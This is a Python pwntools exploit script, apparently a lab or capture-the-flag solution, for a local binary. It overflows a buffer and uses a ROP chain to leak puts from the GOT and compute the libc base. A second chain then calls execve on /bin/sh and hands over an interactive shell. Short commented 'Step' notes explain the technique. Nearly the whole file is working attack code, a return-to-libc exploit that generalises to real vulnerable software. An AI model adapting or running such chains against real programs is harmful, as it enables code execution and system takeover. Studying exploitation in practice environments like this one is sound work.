#!/bin/python3

from pwn import process, gdb, p64
from pwn import ELF, ROP
from sys import argv

p = gdb.debug('./a.out', gdbscript="""
    b *main
    continue
""") if len(argv) > 1 else process('./a.out')

elf = ELF('./a.out')
rop = ROP(elf)
libc = elf.libc

pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_ret = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_ret = rop.find_gadget(['pop rdx', 'ret'])[0]


"""

Step 1: Leaking libc

    Take advantage of the GOT and PLT. Specifically,
if we pass the GOT entry for puts into puts itself
we can leak where exactly puts is located and use it
to calculate where the base address of libc is. Also,
because this binary only gives us one opportunity to
provide a payload, we will need to include _start in
the ROP chian such that it restarts the binary while
keeping the same address space layout.

"""

chain = p64(pop_rdi_ret)        \
    + p64(elf.got['puts'])      \
    + p64(elf.plt['puts'])      \
    + p64(elf.sym['_start'])
payload = b'i' * 0x58 + chain
p.sendline(payload)

p.recvuntil(b'Hello\n')
puts_leak = int.from_bytes(p.recv(6), 'little')
libc_base = puts_leak - libc.sym['puts']

# It also helps to specify the base address in this
#   elf object. Less math to keep track of c:
libc.address = libc_base


"""

Step 2: Return to libc to get a shell

    Since we were able to baiscally restart the
entire program while keeping the address space layout
the the same, we can use anything we want in libc. This
includes strings, and functions. For this example, I'll
just construct a rop chain to call execve on /bin/sh.

    I suggest reading the man page and understanding the
x86 calling convention to truly understand how this chain
works.

"""

# If we knew where our buffer started, we could
#   alternatively include this string in our ROP
#   payload ourselves, but I don't want to leak it
#   ...
#   This is a little easier in this case
bin_sh_addr = next(libc.search(b'/bin/sh'))

# It is worth understanding the parameters execve
#   uses. It is important to set rdi and rsi to 0
chain = p64(pop_rdi_ret)        \
    + p64(bin_sh_addr)          \
    + p64(pop_rsi_ret)          \
    + p64(0)                    \
    + p64(pop_rdx_ret)          \
    + p64(0)                    \
    + p64(libc.sym['execve'])
payload = b'i' * 0x58 + chain
p.sendline(payload)

"""

Step 3: Literally what ever you want lmao gg2ez

"""

p.interactive()
